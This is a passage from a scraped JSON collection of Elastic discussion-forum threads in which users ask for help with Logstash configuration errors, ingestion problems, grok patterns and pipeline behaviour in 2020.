sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source) ~[na:1.8.0_241] at java.lang.ClassLoader.loadClass(Unknown Source) ~[na:1.8.0_241] at org.springframework.boot.devtools.restart.classloader.RestartClassLoader.loadClass(RestartClassLoader.java:144) ~[spring-boot-devtools-2.2.5.RELEASE.jar:2.2.5.RELEASE] at java.lang.ClassLoader.loadClass(Unknown Source) ~[na:1.8.0_241] ... 42 common frames omitted Below is my sample config file input { beats{ port => 5044 } } filter { if [message] =~ \"\\tat\" { grok { match => [\"message\", \"^(\\tat)\"] add_tag => [\"stacktrace\"] } } Screenshot (231)1920×1080 263 KB if [message] == \"ERROR\"{ grok{ match => {\"message\" => \"%TIMESTAMP_ISO8601:timestamp} % {SPACE} % {LOGLEVEL:loglevel} %{SPACE} % {INT:pid} % {SPACE}---%{SPACE} [%{DATA:threadname}] % {SPACE} % {JAVACLASS:className} % {SPACE} : %{SPACE} Exception - %{JAVACLASS:exceptionName} : %{SPACE} % {DATA:exceptionMesaage} \\n (?m) % {GREEDYDATA:stacktrace}\" } } } output { elasticsearch{ hosts => \"http://localhost:9200\" index => \"filebeat\" } } I am getting below error for above config file -- C:\\logstash-7.6.1\\logstash-7.6.1\\config> C:\\logstash-7.6.1\\logstash-7.6.1\\config> C:\\logstash-7.6.1\\logstash-7.6.1\\config>logstash -f logstashtest.conf Sending Logstash logs to C:/logstash-7.6.1/logstash-7.6.1/logs which is now configured via log4j2.properties [2020-04-07T20:27:16,201][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-07T20:27:16,333][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.1\"} [2020-04-07T20:27:18,118][ERROR][logstash.agent ] Failed to execute action {:action=>LogStash::PipelineAction::Create/pipeline_id:main, :exception=>\"LogStash::ConfigurationError\", :message=>\"Expected one of [A-Za-z0-9_-], [ \\t\\r\\n], \"#\", \"=>\" at line 31, column 18 (byte 564) after filter {\\n\\nif [message] =~ \"\\tat\" {\\n grok {\\n match => [\"message\", \"^(\\tat)\"]\\n add_tag => [\"stacktrace\"]\\n }\\n }\\nif [message] == \"ERROR\"{\\n\\tgrok{\\n\\t\\tmatch => {\"message\" => \"%TIMESTAMP_ISO8601:timestamp} % {SPACE} % {LOGLEVEL:loglevel}\\n%{SPACE} % {INT:pid} % {SPACE}---%{SPACE} \\[%{DATA:threadname}] % {SPACE} % {JAVACLASS:className}\\n% {SPACE} : %{SPACE} Exception - %{JAVACLASS:exceptionName} : %{SPACE} % {DATA:exceptionMesaage}\\n\\n (?m) % {GREEDYDATA:stacktrace}\"\\n\\t}\\n}\\t\\n \\n}\\n \\n\\n\\n\\noutput {\\n elasticsearch\", :backtrace=>[\"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/compiler.rb:47:in compile_imperative'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/compiler.rb:55:in compile_graph'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/compiler.rb:17:in block in compile_sources'\", \"org/jruby/RubyArray.java:2580:in map'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/compiler.rb:14:in compile_sources'\", \"org/logstash/execution/AbstractPipelineExt.java:161:in initialize'\", \"org/logstash/execution/JavaBasePipelineExt.java:47:in initialize'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/java_pipeline.rb:27:in initialize'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/pipeline_action/create.rb:36:in execute'\", \"C:/logstash-7.6.1/logstash-7.6.1/logstash-core/lib/logstash/agent.rb:326:in block in converge_state'\"]} [2020-04-07T20:27:18,590][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9600} [2020-04-07T20:27:23,312][INFO ][logstash.runner ] Logstash shut down.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6746530d-89c5-46a9-87de-4a2a38687a08",
    "url": "https://discuss.elastic.co/t/jdbc-static-prepared-parameters-mismatched-number-of-placeholders-error/226833",
    "title": "Jdbc_static prepared_parameters Mismatched number of placeholders error",
    "category": [
      "Logstash"
    ],
    "author": "jgabor",
    "date": "April 7, 2020, 6:59am April 7, 2020, 3:14pm April 8, 2020, 5:09am",
    "body": "Hi! When using the jdbc_static filter and using prepared_parameters in lookup I get a \"Mismatched number of placeholders\" error. The configuration looks like this: local_lookups => [ { id => \"local-meld\" query => \"SELECT nr ,meldung FROM meld WHERE ts_einfuegung = ? AND system_nr = ?\" prepared_parameters => [ \"[ts_einfuegung]\", \"[system_nr]\" ] target => \"meldungen\" } ] This is the error message: [main] Pipeline aborted due to error {:pipeline_id=>\"main\", :exception=>#<Sequel::Error: Mismatched number of placeholders (2) and placeholder arguments (1) when using placeholder string> The Logstash Version I use is the Docker container logstash:7.6.1 What am I doing wrong here or is this a bug? Thanks, Jan",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "21d56b63-72e2-4278-811f-df06da3692d1",
    "url": "https://discuss.elastic.co/t/logstash-persisant-queue-usage-without-input/227051",
    "title": "Logstash persisant queue usage without input",
    "category": [
      "Logstash"
    ],
    "author": "hlamsc",
    "date": "April 8, 2020, 4:51am",
    "body": "Hello, a week ago we build a small logstash \"cluster\" containing 3 logstash nodes (virtual machines) and haproxys for roundrobin. It worked really nice so we tried out persistent queue on one of the three nodes. As aspected it worked over the day (no messages where queued tho, but we could see the queue over kibana monitoring etc), so we let it enabled. The next day we had to find out that the queue was completly full. Something happend at 00:20 and the queue (50GB) was full in one hour. It stayed full for 6-7 hours, then the messages were processed. 1825×512 30.7 KB We couldnt figure out what happend, but we thoguht that something on this time had send a lot of messages. So for debuddig we disabled the logstash node in haproxy so there wont comming any messages in on that node. Weirdly...The same thing still happens. Not in this size ratio, but we can still see that the queue usages goes up at 00:20. Even without any messages comming in. 2819×516 29.5 KB We have absolutley no idea whats happening here? Do you have a hint or idea? Our next try would be to add an hardware logstash node to that cluster with enabled persistant queue to see if this behaviour is the same or not. Best regards!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3b563250-d4ab-4946-90e1-bfe2976210b4",
    "url": "https://discuss.elastic.co/t/is-event-api-synchronous-or-asynchronous/227040",
    "title": "Is Event API synchronous or asynchronous?",
    "category": [
      "Logstash"
    ],
    "author": "Sarah_Taaher_Bonna",
    "date": "April 8, 2020, 2:12am",
    "body": "Hi, I understand that the Event API has been rewritten in Java. I would like to know if the event.get and event.set methods are synchronous or asynchronous. Thanks. Regards, Sarah",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "39fe8df4-7601-445c-b012-c2eac5fd8708",
    "url": "https://discuss.elastic.co/t/is-logstash-useful-for-structured-data/226883",
    "title": "Is Logstash useful for structured data?",
    "category": [
      "Logstash"
    ],
    "author": "Robert_Ga",
    "date": "April 7, 2020, 11:43am April 7, 2020, 12:38pm April 7, 2020, 1:00pm April 7, 2020, 1:17pm April 7, 2020, 2:43pm April 7, 2020, 10:05pm",
    "body": "Hello everyone, Recently I started to migrate some data into Elasticsearch using the Python client. The data is already structured in json files and needs some processing like: lowercase all the values handle value inconsistencies for country field( ex: \"United States of America\" and \"USA\") add some extra fields In this case, is still worth it to use Logstash( from what I have seen in documentation and tutorials is mainly used for formatting log files using grok) or is better to make all the processing in python and then add the data into Elasticsearch? Thank you!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "a6b1ecbd-133a-4701-bdb5-d17b8e7473c3",
    "url": "https://discuss.elastic.co/t/unable-to-ingest-json-file-and-output-to-stdout/226793",
    "title": "Unable to ingest JSON file and output to stdout",
    "category": [
      "Logstash"
    ],
    "author": "leosoaivan",
    "date": "April 6, 2020, 10:44pm April 6, 2020, 11:10pm April 7, 2020, 2:36pm April 7, 2020, 5:39pm April 7, 2020, 8:23pm April 7, 2020, 8:44pm",
    "body": "New to Logstash, and I've attempted to start with a simple JSON file, though I can't get anything to output to stdout. It just hangs at Successfully started Logstash API endpoint {:port=>9646} I've looked at a few posts to try to get some ideas, to no avail: Best way to parse json input? Logstash is not reading Json file I've been able to get Logstash to work with the input plugins stdin and exec, but I really would like to get it to work with a .json file. Here's what I have: test.json: { \"message\": \"test\" } logstash.conf: input { file { codec => json path => [\"/db/seed/test.json\"] start_position => \"beginning\" } } output { stdout { codec => \"rubydebug\" } } Output: [2020-04-06T18:28:59,741][INFO ][logstash.setting.writabledirectory] Creating directory {:setting=>\"path.queue\", :path=>\"/Users/<project_path>/data/logstash/2020-04-06_22-28-40/queue\"} [2020-04-06T18:28:59,872][INFO ][logstash.setting.writabledirectory] Creating directory {:setting=>\"path.dead_letter_queue\", :path=>\"/Users/<project_path>/data/logstash/2020-04-06_22-28-40/dead_letter_queue\"} [2020-04-06T18:28:59,971][WARN ][logstash.config.source.multilocal] Ignoring the 'pipelines.yml' file because modules or command line options are specified [2020-04-06T18:28:59,982][INFO ][logstash.runner ] Starting Logstash {\"logstash.version\"=>\"7.6.2\"} [2020-04-06T18:29:00,013][INFO ][logstash.agent ] No persistent UUID file found. Generating new UUID {:uuid=>\"dbafbee1-c8e9-44bf-889c-0cc21921765b\", :path=>\"/Users/<project_path>/data/logstash/2020-04-06_22-28-40/uuid\"} [2020-04-06T18:29:01,781][INFO ][org.reflections.Reflections] Reflections took 39 ms to scan 1 urls, producing 20 keys and 40 values [2020-04-06T18:29:03,339][WARN ][org.logstash.instrument.metrics.gauge.LazyDelegatingGauge][main] A gauge metric of an unknown type (org.jruby.RubyArray) has been created for key: cluster_uuids. This may result in invalid serialization. It is recommended to log an issue to the responsible developer/development team. [2020-04-06T18:29:03,400][INFO ][logstash.javapipeline ][main] Starting pipeline {:pipeline_id=>\"main\", \"pipeline.workers\"=>8, \"pipeline.batch.size\"=>125, \"pipeline.batch.delay\"=>50, \"pipeline.max_inflight\"=>1000, \"pipeline.sources\"=>[\"/Users/<project_path>/logstash.conf\"], :thread=>\"#<Thread:0x796af4b2 run>\"} [2020-04-06T18:29:04,480][INFO ][logstash.javapipeline ][main] Pipeline started {\"pipeline.id\"=>\"main\"} [2020-04-06T18:29:04,542][INFO ][filewatch.observingtail ][main] START, creating Discoverer, Watch with file and sincedb collections [2020-04-06T18:29:04,556][INFO ][logstash.agent ] Pipelines running {:count=>1, :running_pipelines=>[:main], :non_running_pipelines=>[]} [2020-04-06T18:29:04,971][INFO ][logstash.agent ] Successfully started Logstash API endpoint {:port=>9646} All-in-all, the file input plugin looks like it should be quite simple, but here I am. Any insight or advice would be greatly appreciated.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "ff80d6a9-8179-4fac-948f-d00fe890bea7",
    "url": "https://discuss.elastic.co/t/newbie-trying-to-use-syslog-date-and-time-as-timestamp-in-logstash/226948",
    "title": "Newbie trying to use syslog date and time as timestamp in Logstash",
    "category": [
      "Logstash"
    ],
    "author": "dbaddorf",
    "date": "April 7, 2020, 4:07pm April 7, 2020, 6:28pm April 7, 2020, 6:50pm April 7, 2020, 8:07pm April 7, 2020, 8:25pm",
    "body": "Hello! I know that I'm trying to do something simple, and I'm just getting started with Elasticsearch/Logstash, but I just can't seem to get the right combination, so I was hoping that someone might point me in the correct direction. I am trying to import a bunch of old syslog messages into Elasticsearch using Logstash since I already have a Logstash configuration file which works for current syslog messages. The problem is that my prior syslog files require that the date be parsed and used for the timestamp. My problem is that I don't know how/where to put the date conversion code in my configuration file. The logs that I want to ingest look like this: 2020-02-19 23:59:59 Local7.Notice 172.25.0.1 date=2020-02-19 time=23:59:59 devname=\"firewall\" ... Here is my Logstash configuration file: input { file { path => \"/home/templogs/parse.txt\" type => \"forti_log\" start_position => \"beginning\" ignore_older => 3000000 } } filter { if [type] == \"forti_log\" { kv { source => \"message\" exclude_keys => [ \"type\", \"subtype\" ] } geoip { source => \"dst\" } geoip { source => \"dstip\" } geoip { source => \"src\" } geoip { source => \"srcip\" } mutate { rename => [ \"dst\", \"dst_ip\" ] rename => [ \"dstip\", \"dst_ip\" ] rename => [ \"dstport\", \"dst_port\" ] rename => [ \"devname\", \"device_id\" ] rename => [ \"status\", \"action\" ] rename => [ \"src\", \"src_ip\" ] rename => [ \"srcip\", \"src_ip\" ] rename => [ \"zone\", \"src_intf\" ] rename => [ \"srcintf\", \"src_intf\" ] rename => [ \"srcport\", \"src_port\" ] rename => [ \"rcvd\", \"byte_recieved\" ] rename => [ \"rcvdbyte\", \"bytes_recieved\" ] rename => [ \"sentbyte\", \"bytes_sent\" ] rename => [ \"sent\", \"bytes_sent\" ] convert => [\"bytes_recieved\", \"integer\"] convert => [\"bytes_sent\", \"integer\"] remove_field => [ \"msg\" ] } } } output { if [type] == \"forti_log\" { stdout { codec => rubydebug } elasticsearch { hosts => \"localhost:9200\" index => \"forti-%{+YYYY.MM.dd}\" } } } Can someone please show me where I should put the date match commands? And far less importantly, it seems Logstash only reads newly written lines in my parse.txt file. Of course I can fake it out with \"cat syslog >> parse.txt\" after Logstash is running, but I wondered if there is a way to just have Logstash read through the file from top to bottom and then exit when the input file has been parsed. Thanks for any offered help!",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "521e43ed-6b38-471b-8ce1-15988656f46d",
    "url": "https://discuss.elastic.co/t/logstash-imap-cannot-decode-entire-message-errors/227000",
    "title": "Logstash IMAP \"cannot decode entire message\" errors",
    "category": [
      "Logstash"
    ],
    "author": "jeffkirk1",
    "date": "April 7, 2020, 7:53pm",
    "body": "Just started using the logstash-imap-input filter to pull logs from a UNIX IMAP server. Using Logstash 7.6.1 running on a Scientific Linux 6.7 server (don't ask). The pipeline worked for 535 messages before it ran into this error that appears to be blocking further progress: Can not decode an entire message, try calling #decoded on the various fields and body or parts if it is a multipart message. Here's the full body of the message in /var/log/logstash/logstash-plain.log: [2020-04-07T12:42:10,367][ERROR][logstash.inputs.imap ][root_mail] Encountered error NoMethodError {:message=>\"Can not decode an entire message, try calling #decoded on the various fields and body or parts if it is a multipart message.\", :backtrace=>[\"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/mail-2.6.6/lib/mail/message.rb:1903:in `decoded'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:163:in `parse_mail'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:116:in `block in check_mail'\", \"org/jruby/RubyArray.java:1814:in `each'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:112:in `block in check_mail'\", \"org/jruby/RubyArray.java:1856:in `each_slice'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:110:in `check_mail'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:91:in `block in run'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/stud-0.0.23/lib/stud/interval.rb:20:in `interval'\", \"/usr/share/logstash/vendor/bundle/jruby/2.5.0/gems/logstash-input-imap-3.0.7/lib/logstash/inputs/imap.rb:90:in `run'\", \"/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:328:in `inputworker'\", \"/usr/share/logstash/logstash-core/lib/logstash/java_pipeline.rb:320:in `block in start_input'\"]} Here's the input filter configuration with sanitized hostnames and account data: input { imap { id => \"root_mail_input\" host => \"somehost\" port => 993 check_interval => 10 user => \"someaccount\" password => \"somepassword\" strip_attachments => true delete => true expunge => true } } I added the delete and expunge flags in an attempt to clear the backlog that's evidently there, but it doesn't help. The data are sent to Kafka for further import into an Elasticsearch 7.6.1 cluster. The input filter documentation is a little sparse (a lot sparse, actually) and the only other mentions of this kind of problem I've found on other sites and on Github were never answered. Any help would be appreciated.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6dcb01bb-4db8-4485-86e8-210a172953c4",
    "url": "https://discuss.elastic.co/t/permission-error-when-performing-logstash-f/226976",
    "title": "Permission error when performing logstash -f",
    "category": [
      "Logstash"
    ],
    "author": "Al1",
    "date": "April 7, 2020, 6:15pm April 7, 2020, 7:50pm",
    "body": "Hi - I am very new to logstash and I am running into an issue when trying to perform a logstash - f on my .config file. This is my .config file: input { file { path => \"/Users/alpitshah/Data/cars.csv\" start_position => \"beginning\" sincedb_path => \"/dev/null\" } } filter { csv { separator => \",\" columns => [\"maker\",\"model\",\"mileage\",\"manufacture-year\",\"engine_displacement\",\"engine_power\",\"body_type\", \"color_slug\",\"stk_year\",\"transmission\",\"door_count\",\"seat_count\",\"fuel_type\",\"date_created\",\"date_last_seen\", \"price_eur\"] } mutate {convert => [\"mileage\", \"integer\"]} mutate {convert => [\"price_eur\", \"float\"]} mutate {convert => [\"door_count\", \"integer\"]} mutate {convert => [\"engine_power\", \"integer\"]} mutate {convert => [\"seat_count\", \"integer\"]} } output { elasticsearch { hosts => \"localhost\" index => \"cars\" document_type => \"sold_cars\" } stdout {} } When I run the code: bin/logstash -f /Users/alpitshah/Data/logstash_cars.config I get the following error: Plugin: <LogStash::Inputs::File start_position=>\"beginning\", path=>[\"/Users/alpitshah/Data/cars.csv\"], id=>\"ba6990299d85aa8232a772dd81377d0289004654ce252354205802a68b7bde83\", sincedb_path=>\"/dev/null\", enable_metric=>true, codec=><LogStash::Codecs::Plain id=>\"plain_f0d1be3c-8bd2-4a80-a946-82deef5463a4\", enable_metric=>true, charset=>\"UTF-8\">, stat_interval=>1.0, discover_interval=>15, sincedb_write_interval=>15.0, delimiter=>\"\\n\", close_older=>3600.0, mode=>\"tail\", file_completed_action=>\"delete\", sincedb_clean_after=>1209600.0, file_chunk_size=>32768, file_chunk_count=>140737488355327, file_sort_by=>\"last_modified\", file_sort_direction=>\"asc\", exit_after_read=>false> Error: Permission denied - Permission denied Exception: Errno::EACCES Stack: org/jruby/RubyFile.java:1269:in `utime' uri:classloader:/META-INF/jruby.home/lib/ruby/stdlib/fileutils.rb:1133:in `block in touch' org/jruby/RubyArray.java:1814:in `each' uri:classloader:/META-INF/jruby.home/lib/ruby/stdlib/fileutils.rb:1130:in `touch' /Users/alpitshah/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-input-file-4.1.16/lib/filewatch/sincedb_collection.rb:22:in `initialize' /Users/alpitshah/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-input-file-4.1.16/lib/filewatch/observing_base.rb:62:in `build_watch_and_dependencies' /Users/alpitshah/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-input-file-4.1.16/lib/filewatch/observing_base.rb:56:in `initialize' /Users/alpitshah/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-input-file-4.1.16/lib/logstash/inputs/file.rb:341:in `start_processing' /Users/alpitshah/logstash-7.6.2/vendor/bundle/jruby/2.5.0/gems/logstash-input-file-4.1.16/lib/logstash/inputs/file.rb:346:in `run' /Users/alpitshah/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:328:in `inputworker' /Users/alpitshah/logstash-7.6.2/logstash-core/lib/logstash/java_pipeline.rb:320:in `block in start_input' [2020-04-07T14:04:21,236][INFO ][filewatch.observingtail ][main] START, creating Discoverer, Watch with file and sincedb collections [2020-04-07T14:04:21,239][ERROR][logstash.javapipeline ][main] A plugin had an unrecoverable error. Will restart this plugin. Pipeline_id:main I am not sure how to tackle this problem. I followed a Youtube tutorial and not sure what I am missing. Any help would be much appreciated.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7bcae08b-e23d-4b3c-9bd5-c6656ada2c7e",
    "url": "https://discuss.elastic.co/t/fields-are-not-shown-in-available-fields-in-kibana/226716",
    "title": "Fields are not shown in \"Available fields\" in KIbana",
    "category": [
      "Logstash"
    ],
    "author": "Manav_Chopra",
    "date": "April 7, 2020, 6:53pm April 6, 2020, 3:52pm April 7, 2020, 8:06am April 7, 2020, 11:11am April 7, 2020, 12:52pm April 7, 2020, 1:25pm April 7, 2020, 3:13pm April 7, 2020, 6:50pm",
    "body": "I have added fields i.e through mapping API and all the fields are shown on index management> index pattern page But when I go to Discover tab, no new fields are shown there. Can you please tell what is the missing part and also for visualization, something more is required to use those fields while visualization? I have done below field addition in the index in kibana dev tools using PUT index/_mapping. I want these fields to be shown on \"Available fields\" Please refer https://pastebin.com/z9YrN1wW",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "3f14b72b-055f-4c2f-a5fe-79e968f86fc1",
    "url": "https://discuss.elastic.co/t/hello-world-doesnt-output-to-logstash/226985",
    "title": "Hello World doesn't output to Logstash",
    "category": [
      "Logstash"
    ],
    "author": "eStrux-MAB",
    "date": "April 7, 2020, 6:41pm",
    "body": "I have a Logstash conf file configured as such: input { exec { command => \"/etc/logstash/scripts/do_something.py\" interval => 60 } } output { stdout {} } The executed Python script is as follows: print('Hello world!') That's it. As bog-standard and as straightforward as this. And now, here's what actually lands into the stdout console when I monitor Logstash's logging: Apr 7 14:05:34 myhostname logstash: { Apr 7 14:05:34 myhostname logstash: \"host\" => \"myhostname.mydomain.com\", Apr 7 14:05:34 myhostname logstash: \"command\" => \"/etc/logstash/scripts/do_something.py\", Apr 7 14:05:34 myhostname logstash: \"@timestamp\" => 2020-04-07T18:05:34.781Z, Apr 7 14:05:34 myhostname logstash: \"message\" => \"\", Apr 7 14:05:34 myhostname logstash: \"@version\" => \"1\" Apr 7 14:05:34 myhostname logstash: } For whatever reason I don't understand, the execution completes successfully, but the words \"Hello World!\" aren't present at all. Yet, if I run the Python script standalone, \"Hello World!\" does output to the console as normal. Meanwhile, I have several other Logstash pipelines and Python scripts that are much more elaborate and output what shows up in stdout to various destinations, and they work 100%. Obviously I must be doing something dead wrong in what turns out to be no more than the most basic of tests. I must've been banging myself against this for far too long, because I can't for the life of me figure out what's going on. I had begun with a slightly modified copy of another pipeline/script to test some error handling, and in trying to figure out the root cause of why my test wouldn't output anything, stripped it down until I was reduced to... this. A plain simple Hello World that should be foolproof, yet, go figure... isn't. Any insight would be greatly appreciated.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4a429fd8-1bd0-4d0b-a59f-9d45cdfd0f94",
    "url": "https://discuss.elastic.co/t/getting-json-formated-data-to-elastic-in-multiple-docs/226934",
    "title": "Getting Json Formated Data to elastic in multiple Docs",
    "category": [
      "Logstash"
    ],
    "author": "KaiThoZ",
    "date": "April 7, 2020, 3:22pm April 7, 2020, 3:33pm April 7, 2020, 6:07pm",
    "body": "Hello, certainly this has been asked many times before but after hours of working on this topic I was unable to solve my problem. I have Json data that looks like this in ruby debug, I want to ghav each of those randomly choosen connection Identifiers to become a single entry in elastic with all attributes attached to this elastic object ( sorry Im trying to get the wording right bit will most certainly fail ), can anyone push me in the right direction?: { \"@timestamp\" => 2020-04-07T15:08:33.479Z, \"12210d17-8467-4cc7-9e5f-ce70725a7b44\" => { \"identifier\" => \"12210d17-8467-4cc7-9e5f-ce70725a7b44\", \"startDate\" => 1586271140009, \"connectable\" => true, \"connectionIdentifier\" => \"1\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"b2bcac55-b4e6-404d-8c93-78a059de9978\" => { \"identifier\" => \"b2bcac55-b4e6-404d-8c93-78a059de9978\", \"startDate\" => 1586269346913, \"connectable\" => true, \"connectionIdentifier\" => \"13\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"f85bca9e-518b-4040-94b8-c69a9e780961\" => { \"identifier\" => \"f85bca9e-518b-4040-94b8-c69a9e780961\", \"startDate\" => 1586267209033, \"connectable\" => true, \"connectionIdentifier\" => \"5181\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"1c5a6980-64b3-426b-8d30-20d9513e059f\" => { \"identifier\" => \"1c5a6980-64b3-426b-8d30-20d9513e059f\", \"startDate\" => 1586261548607, \"connectable\" => true, \"connectionIdentifier\" => \"532\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"@version\" => \"1\", \"e822956d-40b5-4c24-962e-a07a5b0e0ac9\" => { \"identifier\" => \"e822956d-40b5-4c24-962e-a07a5b0e0ac9\", \"startDate\" => 1586263078302, \"connectable\" => true, \"connectionIdentifier\" => \"4622\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"ee461fb0-0932-4b2f-a2d1-d05485920404\" => { \"identifier\" => \"ee461fb0-0932-4b2f-a2d1-d05485920404\", \"startDate\" => 1586271711558, \"connectable\" => true, \"connectionIdentifier\" => \"2933\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"command\" => \"/opt/get_history.sh\", \"ddfe1895-8ba3-4f91-99d3-cbd10ab90b5a\" => { \"identifier\" => \"ddfe1895-8ba3-4f91-99d3-cbd10ab90b5a\", \"startDate\" => 1586270958993, \"connectable\" => true, \"connectionIdentifier\" => \"4453\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"19b7f430-61c5-481a-9c3a-4923f542d8fc\" => { \"identifier\" => \"19b7f430-61c5-481a-9c3a-4923f542d8fc\", \"startDate\" => 1586257524378, \"connectable\" => true, \"connectionIdentifier\" => \"3246\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"9b2dd1a6-8fde-4f3a-aea7-e9480a3a9d30\" => { \"identifier\" => \"9b2dd1a6-8fde-4f3a-aea7-e9480a3a9d30\", \"startDate\" => 1586268862890, \"connectable\" => true, \"connectionIdentifier\" => \"2265\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"9ad05e55-dd2f-4f63-a5d2-692b0fe96ca0\" => { \"identifier\" => \"9ad05e55-dd2f-4f63-a5d2-692b0fe96ca0\", \"startDate\" => 1586268084592, \"connectable\" => true, \"connectionIdentifier\" => \"5405\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"host\" => \"66c51c3d15fc\", \"f5bbc6de-32b0-4647-b7f8-337d708884c9\" => { \"identifier\" => \"f5bbc6de-32b0-4647-b7f8-337d708884c9\", \"startDate\" => 1586270758153, \"connectable\" => true, \"connectionIdentifier\" => \"3393\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"0be8f744-d4e3-4ba1-8053-2acb3c8e8ff0\" => { \"identifier\" => \"0be8f744-d4e3-4ba1-8053-2acb3c8e8ff0\", \"startDate\" => 1586236423739, \"connectable\" => true, \"connectionIdentifier\" => \"2873\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"507c213a-9362-4565-8a01-0033edc5b38e\" => { \"identifier\" => \"507c213a-9362-4565-8a01-0033edc5b38e\", \"startDate\" => 1586264411463, \"connectable\" => true, \"connectionIdentifier\" => \"3091\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"df79596d-60bf-41d0-959e-a9f8d9f5c138\" => { \"identifier\" => \"df79596d-60bf-41d0-959e-a9f8d9f5c138\", \"startDate\" => 1586271680146, \"connectable\" => true, \"connectionIdentifier\" => \"4051\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"2cd356a9-5bc9-4c4a-a7ab-f77c9a5a5097\" => { \"identifier\" => \"2cd356a9-5bc9-4c4a-a7ab-f77c9a5a5097\", \"startDate\" => 1586271991684, \"connectable\" => true, \"connectionIdentifier\" => \"4864\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"bf958868-d8e7-4d82-8297-2fdb3e1121f9\" => { \"identifier\" => \"bf958868-d8e7-4d82-8297-2fdb3e1121f9\", \"startDate\" => 1586244261862, \"connectable\" => true, \"connectionIdentifier\" => \"1650\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"9a67ee72-b41a-49ed-95fa-e66c937ca6cb\" => { \"identifier\" => \"9a67ee72-b41a-49ed-95fa-e66c937ca6cb\", \"startDate\" => 1586268488567, \"connectable\" => true, \"connectionIdentifier\" => \"4783\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" }, \"bd20687b-ed3f-4aca-8cf1-360c1e54aeb7\" => { \"identifier\" => \"bd20687b-ed3f-4aca-8cf1-360c1e54aeb7\", \"startDate\" => 1586263966578, \"connectable\" => true, \"connectionIdentifier\" => \"5744\", \"username\" => \"xxx\", \"remoteHost\" => \"149.242.248.XX\" } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "606e762c-75e7-4aa8-b34c-c148116b5c1c",
    "url": "https://discuss.elastic.co/t/logstash-generate-a-random-number-for-an-http-wait-request/226936",
    "title": "Logstash generate a random number for an HTTP wait request?",
    "category": [
      "Logstash"
    ],
    "author": "stcdarrell",
    "date": "April 7, 2020, 3:25pm April 7, 2020, 3:40pm April 7, 2020, 3:53pm",
    "body": "hi, i have a logstash http filter that reaches out to a public API for enrichment of the data. i'm limited to 1 request per second. i've thrown a \"sleep\" filter in.. to make it wait 1 second.. i'm still getting \"request limit reached\" i'm guessing because logstash is multi-threaded and sending more than one request at a time. the only solution i can thing of is making thje sleep a random amount between 1-10 seconds.. so each threat waits a different amount of time. is there a way to do this easily? sleep { time => %[random number between 1 and 10]% every => \"1\" } i hope that makes sense",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2d9c7124-7127-42e9-81ad-a84ae6b0a79a",
    "url": "https://discuss.elastic.co/t/shodan-query-returns-an-ugly-result-i-cant-seem-to-fix/226778",
    "title": "Shodan query returns an ugly result i cant seem to fix",
    "category": [
      "Logstash"
    ],
